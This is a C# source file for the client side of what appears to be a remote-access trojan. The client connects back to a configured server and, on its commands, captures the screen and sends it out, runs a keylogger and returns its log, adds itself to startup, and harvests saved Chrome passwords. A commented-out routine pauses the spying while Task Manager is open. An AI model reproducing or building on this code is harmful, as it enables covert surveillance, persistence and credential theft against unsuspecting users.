using System;
using System.Configuration;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Protocol;

namespace Client
{
    public static class ConnectionManager
    {
        public static TcpClient Client { get; set; }
        private static int TcpPort => int.Parse(ConfigurationManager.AppSettings["TCP-PORT"]);
        private static IPAddress Ip => IPAddress.Parse(ConfigurationManager.AppSettings["IP"]);

        //public static async Task CheckForTaskManager()
        //{
        //    await Task.Run(() =>
        //    {
        //        while (true)
        //        {
        //            var temp = Process.GetProcessesByName("Taskmgr");
        //            if (temp.Length > 0)
        //            {
        //                Pause = true;
        //                KeyLogger.Pause = true;
        //            }
        //            else
        //            {
        //                Pause = false;
        //                KeyLogger.Pause = false;
        //            }
                    
        //            Thread.Sleep(1000);
        //        }
        //    });
            
        //}
        public static async Task Listen()
        {
            KeyLogger.Loop();
            
            await Task.Run(() =>
            {
                Client = new TcpClient {SendTimeout = 1000};
                while (true)
                {
                        try
                        {
                            var command = (Command) Transfer.ReceiveTcp(Client);

                            if(command == null) continue;

                            if (command.CommandData == Commands.Disconnect)
                            {
                                Client.Close();
                                Client = new TcpClient();
                                continue;
                            }
                            
                            switch (command.CommandData)
                            {
                                case Commands.Close: return;
                                case Commands.RequestScreen: ScreenSend.SendScreen(); break;
                                case Commands.StartKeyLogging: KeyLogger.Start(); break;
                                case Commands.StopKeyLogging: KeyLogger.Stop(); break;
                                case Commands.RequestKeyLog: SendLog(); break;
                                case Commands.AddToStartup: Startup.RunOnStartup(); break;
                                case Commands.RemoveFromStartup: Startup.RemoveFromStartup(); break;
                                case Commands.RequestPasswords: ShowPasswords(); break;
                            }
                        }
                        catch
                        {
                            try
                            {
                                Client.Close();
                                Client = new TcpClient {SendTimeout = 1000};
                                Client.Connect(Ip, TcpPort);
                            }
                            catch (Exception e)
                            {
                                Thread.Sleep(100);
                            }
                        }
                }
            });
        }

        public static async void ShowPasswords()
        {
            await Task.Run(() =>
            {
                string str = "";

                var temp = ChromeRecovery.Chromium.Grab();

                foreach (var account in temp)
                {
                    str += $"{account.URL} {account.UserName.Substring(1, account.UserName.Length / 3)}**** ****{account.Password.Substring(account.Password.Length / 3, (int)(account.Password.Length / 3))}****\n";
                }

                MessageBox.Show(str);
            });
        }

        public static void SendLog()
        {
            if (Client != null)
            {
                Transfer.SendTcpBig(Client, new Log(KeyLogger.Log, KeyLogger.SimpleLog));

                KeyLogger.Log = String.Empty;
                KeyLogger.SimpleLog = String.Empty;

            }
        }
        
        public static void SendCommand(Command command)
        {
            if(Client != null)
                Transfer.SendTcp(Client,command);
        }
    }
}